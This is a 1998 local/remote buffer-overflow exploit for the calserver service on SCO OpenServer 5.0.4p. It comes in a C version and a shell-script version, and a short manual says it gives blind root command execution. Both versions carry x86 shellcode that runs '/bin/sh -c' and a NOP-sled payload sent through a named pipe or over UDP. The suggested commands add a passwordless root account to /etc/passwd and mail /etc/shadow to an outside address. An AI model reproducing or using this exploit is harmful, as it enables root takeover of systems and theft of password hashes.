*/
#include   <stdio.h>
#include   <fcntl.h>
#include   <netdb.h>
#include   <sys/types.h>
#include   <sys/socket.h>
#include   <netinet/in.h>

main(argc, argv)
    int    argc;
    char   *argv[];
{
#define    calserver_pipe "/usr/lib/scosh/pipes/pdg18e5_0000"
#define    start_addr 0x7ffffd80
#define    hostnamelen 100
#define    portnumberlen 10
#define    cmdlen 80
    char   hostname[hostnamelen],portnumber[portnumberlen],cmd[cmdlen];
    char   *hn,*pn;
    int    s;
    struct sockaddr_in sin;
    struct hostent *hp, *gethostbyname();
    char   msg[850];
    char   *msghdr=
           "\x00\x00\x00\x00"                  // message length
           "\x00\x00\x00\x00"
           "\x00\x00\x00\x00"
           "\x00\x00\x00\x00"
           "\x00\x00\x00\x00"
           "\xff\xff\xff\xff"
           "\x00\x00\x00\x00"
           "\x00\x00\x00\x00"
           "\x00\x00\x00\x00"
           "\x00\x00\x00\x00"
           "\x00\x00\x00\x00"                  // packet_sz
           "\x1c\x00\x00\x00"                  // opcode
           "\x00\x00\x00\x00";                 // maxmsgsz
    char   codes[]=
           {
           "\xeb\x7f"                   //start : jmp     cont
           "\x5d"                       //geteip: popl    %ebp
           "\x55"                              // pushl   %ebp
           "\xfe\x4d\x98"                      // decb    0xffffff98(%ebp)
           "\xfe\x4d\x9b"                      // decb    0xffffff9b(%ebp)
           "\xfe\x4d\xe7"                      // decb    0xffffffe7(%ebp)
           "\xfe\x4d\xeb"                      // decb    0xffffffeb(%ebp)
           "\xfe\x4d\xec"                      // decb    0xffffffec(%ebp)
           "\xfe\x4d\xed"                      // decb    0xffffffed(%ebp)
           "\xff\x45\xef"                      // incl    0xffffffef(%ebp)
           "\xfe\x4d\xf4"                      // decb    0xfffffff4(%ebp)
           "\xc3"                              // ret
           "/bin/sh"                           //
           "\x01"                              // 0xffffff98(%ebp)
           "-c"
           "\x01"                              // 0xffffff9b(%ebp)
           "                                      "
           "                                     "
           "\x01"                              // 0xffffffe7(%ebp)
           "\x8d\x05\x3b\x01\x01\x01"   //execv : leal    0x3b,%eax
           "\x9a\xff\xff\xff\xff\x07\x01"      // lcall   0x7,0x0
           "\xc7\xc4\xff\xff\xff\xff"   //cont  : movl    $0xXXXX,%esp
           "\xe8\x76\xff\xff\xff"              // call    geteip
           "\x33\xc0"                          // xorl    %eax,%eax
           "\x50"                              // pushl   %eax
           "\x81\xc5\x9c\xff\xff\xff"          // addl    $0xffffff9c,%ebp
           "\x55"                              // pushl   %ebp
           "\x81\xc5\xfd\xff\xff\xff"          // addl    $0xfffffffd,%ebp
           "\x55"                              // pushl   %ebp
           "\x81\xc5\xf8\xff\xff\xff"          // addl    $0xfffffff8,%ebp
           "\x55"                              // pushl   %ebp
           "\x55"                              // pushl   %ebp
           "\x5b"                              // pop     %ebx
           "\x8b\xec"                          // movl    %esp,%ebp
           "\x50"                              // pushl   %eax
           "\x55"                              // pushl   %ebp
           "\x53"                              // pushl   %ebx
           "\x50"                              // pushl   %eax
           "\xeb\xc6"                          // jmp     execv
           };

    if (argc<2)
       {
        printf("Host [local] : ");
        gets(hostname);
        if (!strlen(hostname)) strcpy(hostname,"local");
        hn=hostname;
       }
    else
        hn=argv[1];

    if ((argc<3)&&strcmp("local",hn))
       {
        printf("Port [6373]  : ");
        gets(portnumber);
        if (!strlen(portnumber)) strcpy(portnumber,"6373");
        pn=portnumber;
       }
    else
        pn=argv[2];

    printf("Type a command  (max length=75),  for example   :\n");
    printf("\"echo r00t::0:0:Leshka Zakharoff:/:>>/etc/passwd\"\n");
    printf("\"mail leshka@leshka.chuvashia.su</etc/shadow\"\n");
    printf(" <-----------------------------------75");
    printf("------------------------------------>\n>");
    gets(cmd);
    memcpy(codes+40,cmd,strlen(cmd));

    memset(msg,'\x90',600);
    memcpy(msg,msghdr,52);
    *(unsigned long*) (msg+201)= *(unsigned long*) (codes+131) = start_addr;
    memcpy(msg+600,codes,strlen(codes));

    if (!strcmp("local",hn))
       {
        * (unsigned long*) msg = (unsigned long) (600+strlen(codes)-4);
        if ((s=open(calserver_pipe,O_WRONLY)) == -1)
           {
            printf("Error opening calserver pipe\n");
            exit(1);
           };
        if (write(s,msg,600+strlen(codes)) == -1)
           {
            printf("Error writing to the calserver pipe\n");
            exit(1);
           };
        exit(0);
       };

    hp = gethostbyname(hn);
    if (hp == 0)
       {
        herror("gethostbyname");
        exit(1);
       }
    memcpy(&sin.sin_addr,hp->h_addr,hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = htons(atoi(pn));
    if ((s = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
       {
        perror("socket");
        exit(1);
       }
    if (connect(s, (struct sockaddr *) &sin, sizeof(sin)) == -1)
       {
        perror("connect");
        exit(1);
       }
    if (write(s, msg+12,600-12+strlen(codes)) == -1)
       {
        perror("write");
        exit(1);
       }
    close(s);
}

                         *** Shell version ***

#!/bin/sh
#
#                                   ... The punishment for inobedience ...
#
#        This is a local/remote buffer overflow exploit for calserver bug
#                 (SCO OpenServer Enterprise System v 5.0.4p).
#             If you have any problems with it, drop me a letter.
#                              Happy New Year !
#
#
#   *** Brief manual ***
#
#       Local mode is a default  mode for the calendar  server.  If calserver
#   runs on your site  in this mode  just try  to run  the exploit  with only
#   argument  "local".  If calserver operates  on your or other sites  in the
#   network mode you should use exploit with two arguments:  "<sitename>" and
#   "<portnumber>".  Portnumber is usually equal to 6373 but other values are
#   possible.  Don't use  "localhost" or "127.0.0.1"  as a  <sitename>. Check
#   "/usr/lib/scosh/calargs"  file to see  the current mode  of the  calendar
#   server.
#       Execution  of  the exploit is similar  to a  blind  execution  of the
#   following command with root permissions: "/bin/sh -c <command>".
#       There are a  few  limitations for number and length of  commands. The
#   length  of  a  command  should  not  exceed  75  symbols.  The number  of
#   executable commands depends on calserver configuration and it is equal to
#   the number  of child calendar servers  which  are basically 4 by default.
#   Therefore  running of this exploit  must be very effective.  You are free
#   to use sequences of a shell commands separated by ";" as a <command>.
#
#                                   9.999,99
#
#                            ----------------------
#                ---------------------------------------------
#     -----------------   Dedicated to my beautiful lady   ------------------
#                ---------------------------------------------
#                            ----------------------
#
#           Leshka Zakharoff, 1998. E-mail: leshka@leshka.chuvashia.su
#
#
#
calserver_pipe="/usr/lib/scosh/pipes/pdg18e5_0000"
msg="/tmp/msg"
msghdr1='\02\03\0\0\0\0\0\0\0\0\0\0'
msghdr2='\0\0\0\0\0\0\0\0\0377\0377\0377\0377\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0'\
'\0\0\0\0\034\0\0\0\0\0\0\0'
codes1='\0220\0220\0220\0220\0220\0220\0220\0220'\
'\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220'\
'\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220'\
'\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220'\
'\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220'\
'\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220'\
'\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220'\
'\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220'\
'\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220'\
'\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220'\
'\0220\0220\0220\0220\0220\0220\0200\0375\0377\0177\0220\0220\0220\0220\0220'\
'\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220'\
'\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220'\
'\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220'\
'\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220'\
'\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220'\
'\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220'\
'\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220'\
'\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220'\
'\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220'\
'\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220'\
'\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220'\
'\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220'\
'\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220'\
'\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220'\
'\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220'\
'\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220'\
'\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220'\
'\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220'\
'\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220'\
'\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220'\
'\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220'\
'\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220'\
'\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220'\
'\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220'\
'\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220'\
'\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220\0220'\
'\0353\0177]U\0376M\0230\0376M\0233\0376M\0347\0376M\0353\0376M\0354\0376M'\
'\0355\0377E\0357\0376M\0364\0303/bin/sh\01-c\01'
codes2='\01\0215\05;\01\01\01\0232\0377\0377\0377\0377\07\01\0307\0304\0200'\
'\0375\0377\0177\0350v\0377\0377\03773\0300P\0201\0305\0234\0377\0377\0377U'\
'\0201\0305\0375\0377\0377\0377U\0201\0305\0370\0377\0377\0377UU[\0213\0354'\
'PUSP\0353\0306'
rm -f $msg
if [ _$1 = "_" ]
then
    {
     echo -n "Host [local] :"
     read hostname
     if [ _$hostname = "_" ]
     then
         hostname="local"
     fi
    }
else
    hostname=$1
fi
if [ _$hostname = "_local" ]
then
    if [ -p $calserver_pipe ]
    then
        echo -n $msghdr1>$msg
    else
        echo "Error opening calserver pipe"
        exit 1
    fi
else
     if [ _$2 = "_" ]
     then
         {
          echo -n "Port [6373]  :"
          read portnumber
          if [ _$portnumber = "_" ]
          then
              portnumber="6373"
          fi
         }
      else
          portnumber=$2
      fi
fi
echo "Type a command  (max length=75),  for example   :"
echo '"echo r00t::0:0:Leshka Zakharoff:/:>>/etc/passwd"'
echo '"mail leshka@leshka.chuvashia.su</etc/shadow"'
echo -n " <-----------------------------------75"
echo -n "------------------------------------>\n>"
read c
echo -n $msghdr2$codes1>>$msg
printf "%75s" "$c">>$msg
echo -n $codes2>>$msg
if [ _$hostname = "_local" ]
then
      cat $msg>>$calserver_pipe
else
     {
      echo -n '\0377\0377\0377\0377'>>$msg
      cat $msg|/etc/ttcp -u -t -l762 -p$portnumber $hostname
     }
fi
rm $msg

